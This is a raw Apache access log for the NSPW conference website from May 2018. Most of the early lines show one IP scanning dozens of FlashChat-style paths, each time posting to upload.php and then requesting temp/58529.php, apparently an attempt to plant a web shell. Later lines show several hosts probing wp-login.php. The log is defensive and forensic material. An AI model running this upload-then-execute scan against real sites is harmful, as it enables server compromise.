www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:39 -0400] "POST /haces/upload.php HTTP/1.1" 302 505 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:39 -0400] "GET /haces/temp/58529.php HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:39 -0400] "POST /chat-bebica/upload.php HTTP/1.1" 302 517 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:39 -0400] "GET /chat-bebica/temp/58529.php HTTP/1.1" 302 525 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:40 -0400] "POST /smf/chat/upload.php HTTP/1.1" 302 511 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:40 -0400] "GET /smf/chat/temp/58529.php HTTP/1.1" 302 519 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:41 -0400] "POST /FlashChat_v608/chat/upload.php HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:41 -0400] "GET /FlashChat_v608/chat/temp/58529.php HTTP/1.1" 302 541 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:42 -0400] "POST /public/chat/upload.php HTTP/1.1" 302 517 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:42 -0400] "GET /public/chat/temp/58529.php HTTP/1.1" 302 525 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 66.249.73.82 - - [01/May/2018:15:31:42 -0400] "GET /papers/1993/nspw1993-dobson.pdf HTTP/1.1" 302 591 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:42 -0400] "POST /foro/chat/upload.php HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:42 -0400] "GET /foro/chat/temp/58529.php HTTP/1.1" 302 521 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:43 -0400] "POST /islamski-chat/upload.php HTTP/1.1" 302 521 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:43 -0400] "GET /islamski-chat/temp/58529.php HTTP/1.1" 302 529 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:15:31:43 -0400] "GET /papers/2011/nspw2011-bishop.pdf HTTP/1.1" 302 591 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:43 -0400] "POST /chat-sem-registo/upload.php HTTP/1.1" 302 527 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:44 -0400] "GET /chat-sem-registo/temp/58529.php HTTP/1.1" 302 535 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:44 -0400] "POST /chat55/upload.php HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:44 -0400] "GET /chat55/temp/58529.php HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:45 -0400] "POST /flashchat-2/upload.php HTTP/1.1" 302 517 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:45 -0400] "GET /flashchat-2/temp/58529.php HTTP/1.1" 302 525 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:46 -0400] "POST /cchat/chat/upload.php HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:47 -0400] "GET /cchat/chat/temp/58529.php HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:47 -0400] "POST /xfchat/upload.php HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:47 -0400] "GET /xfchat/temp/58529.php HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:47 -0400] "POST /chatroom/upload.php HTTP/1.1" 302 511 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:48 -0400] "GET /chatroom/temp/58529.php HTTP/1.1" 302 519 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:49 -0400] "POST /radiodalmatino/upload.php HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:49 -0400] "GET /radiodalmatino/temp/58529.php HTTP/1.1" 302 531 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:50 -0400] "POST /blog-chat/chat/upload.php HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:50 -0400] "GET /blog-chat/chat/temp/58529.php HTTP/1.1" 302 531 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:50 -0400] "POST /FlashChat/upload.php HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:50 -0400] "GET /FlashChat/temp/58529.php HTTP/1.1" 302 521 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:50 -0400] "POST /blog-chat/upload.php HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:51 -0400] "GET /blog-chat/temp/58529.php HTTP/1.1" 302 521 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:52 -0400] "POST /tag/flashchat-v6-0-8/upload.php HTTP/1.1" 302 535 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:52 -0400] "GET /tag/flashchat-v6-0-8/temp/58529.php HTTP/1.1" 302 543 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:52 -0400] "POST /deface_flashchat/upload.php HTTP/1.1" 302 527 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:52 -0400] "GET /deface_flashchat/temp/58529.php HTTP/1.1" 302 535 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:53 -0400] "POST /topic/page/upload.php HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:53 -0400] "GET /topic/page/temp/58529.php HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:53 -0400] "POST /page/video/upload.php HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:53 -0400] "GET /page/video/temp/58529.php HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:55 -0400] "POST /vid/watch/upload.php HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:55 -0400] "GET /vid/watch/temp/58529.php HTTP/1.1" 302 521 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:55 -0400] "POST /tutaf/upload.php HTTP/1.1" 302 505 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:55 -0400] "GET /tutaf/temp/58529.php HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:56 -0400] "POST /baixar/upload.php HTTP/1.1" 302 526 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:56 -0400] "GET /baixar/temp/58529.php HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:57 -0400] "POST /how-to-install-flashchat-free/upload.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:57 -0400] "GET /how-to-install-flashchat-free/temp/58529.php HTTP/1.1" 302 561 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:58 -0400] "POST /music-search/upload.php HTTP/1.1" 302 519 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:58 -0400] "GET /music-search/temp/58529.php HTTP/1.1" 302 527 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:59 -0400] "POST /search/upload.php HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:59 -0400] "GET /search/temp/58529.php HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:59 -0400] "POST /mp3/list/upload.php HTTP/1.1" 302 511 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:59 -0400] "GET /mp3/list/temp/58529.php HTTP/1.1" 302 519 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:31:59 -0400] "POST /jingyan/upload.php HTTP/1.1" 302 509 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:32:00 -0400] "GET /jingyan/temp/58529.php HTTP/1.1" 302 517 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:32:01 -0400] "POST /exploit/description/upload.php HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:32:01 -0400] "GET /exploit/description/temp/58529.php HTTP/1.1" 302 541 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:32:02 -0400] "POST /exploits/28709/upload.php HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:32:02 -0400] "GET /exploits/28709/temp/58529.php HTTP/1.1" 302 531 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:32:03 -0400] "POST /radiopoljubac/posts/upload.php HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:32:04 -0400] "GET /radiopoljubac/posts/temp/58529.php HTTP/1.1" 302 541 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:32:04 -0400] "POST /m/upload.php HTTP/1.1" 302 497 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:32:04 -0400] "GET /m/temp/58529.php HTTP/1.1" 302 505 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:32:04 -0400] "POST /m/video/upload.php HTTP/1.1" 302 509 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:32:04 -0400] "GET /m/video/temp/58529.php HTTP/1.1" 302 517 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:32:05 -0400] "POST /upload.php HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:32:05 -0400] "GET /temp/58529.php HTTP/1.1" 302 501 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:32:05 -0400] "POST /okolice-ilawa/chat/upload.php HTTP/1.1" 302 531 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [01/May/2018:15:32:06 -0400] "GET /okolice-ilawa/chat/temp/58529.php HTTP/1.1" 302 539 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:15:32:24 -0400] "GET /papers/2012/docs/p67.pdf HTTP/1.1" 302 577 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:15:33:05 -0400] "GET /current/oc.shtml HTTP/1.1" 302 561 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 216.244.66.236 - - [01/May/2018:15:33:44 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 88.124.154.180 - - [01/May/2018:15:34:51 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 88.124.154.180 - - [01/May/2018:15:34:51 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 197.237.35.14 - - [01/May/2018:15:35:14 -0400] "GET /papers/1997/nspw1997-meadows.pdf HTTP/1.1" 302 593 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:15:35:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:15:37:41 -0400] "GET /2007/submission.content HTTP/1.1" 302 519 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 197.206.210.42 - - [01/May/2018:15:37:42 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 197.206.210.42 - - [01/May/2018:15:37:44 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:15:37:53 -0400] "GET /2007/pc.content HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 138.36.229.19 - - [01/May/2018:15:38:28 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 138.36.229.19 - - [01/May/2018:15:38:31 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 90.64.95.241 - - [01/May/2018:15:38:32 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 90.64.95.241 - - [01/May/2018:15:38:34 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 180.76.15.134 - - [01/May/2018:15:38:37 -0400] "GET /2015/organizers HTTP/1.1" 302 522 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 104.129.192.79 - - [01/May/2018:15:39:36 -0400] "HEAD / HTTP/1.1" 302 188 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
www.nspw.org:80 104.129.192.79 - - [01/May/2018:15:39:48 -0400] "HEAD / HTTP/1.1" 302 188 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
www.nspw.org:80 66.249.73.82 - - [01/May/2018:15:40:04 -0400] "GET /current/pc.shtml HTTP/1.1" 302 561 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:15:40:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 73.209.71.29 - - [01/May/2018:15:43:30 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 302 599 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
www.nspw.org:80 73.209.71.29 - - [01/May/2018:15:44:21 -0400] "-" 408 0 "-" "-"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:15:45:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 201.15.185.57 - - [01/May/2018:15:47:32 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 201.15.185.57 - - [01/May/2018:15:47:35 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:15:48:50 -0400] "GET /papers/2004/?C=M;O=A HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:15:50:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 54.36.149.52 - - [01/May/2018:15:51:15 -0400] "GET /2015/sponsors HTTP/1.1" 302 499 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 123.125.143.159 - - [01/May/2018:15:51:47 -0400] "GET / HTTP/1.1" 302 525 "http://www.baidu.com/s?wd=3U6" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
www.nspw.org:80 ::1 - - [01/May/2018:15:51:54 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:15:51:55 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:15:51:56 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 132.205.229.216 - - [01/May/2018:15:53:38 -0400] "GET /2017/cfp HTTP/1.1" 302 545 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
www.nspw.org:80 78.187.65.29 - - [01/May/2018:15:53:38 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 ::1 - - [01/May/2018:15:53:45 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:15:53:46 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:15:53:47 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:15:53:48 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:15:53:49 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:15:53:51 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 78.187.65.29 - - [01/May/2018:15:53:54 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 ::1 - - [01/May/2018:15:54:02 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:15:55:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 14.215.176.12 - - [01/May/2018:15:55:48 -0400] "GET / HTTP/1.1" 302 529 "http://www.baidu.com/s?wd=IBD" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
www.nspw.org:80 ::1 - - [01/May/2018:15:55:54 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:15:55:55 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:15:55:56 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 180.76.15.33 - - [01/May/2018:15:57:20 -0400] "GET /papers/2006/nspw2006-ford.pdf HTTP/1.1" 302 550 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 39.53.16.254 - - [01/May/2018:15:57:21 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 39.53.16.254 - - [01/May/2018:15:57:25 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 54.36.148.216 - - [01/May/2018:15:57:40 -0400] "GET /2009/proceedings/2011/ HTTP/1.1" 302 517 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 180.76.15.9 - - [01/May/2018:15:58:20 -0400] "GET /papers/2010/nspw2010-moore.pdf HTTP/1.1" 302 552 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 216.244.66.236 - - [01/May/2018:15:58:24 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 137.112.228.195 - - [01/May/2018:15:58:42 -0400] "GET /papers/2007/nspw2007-mannan.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1"
www.nspw.org:80 137.175.151.77 - - [01/May/2018:15:58:57 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
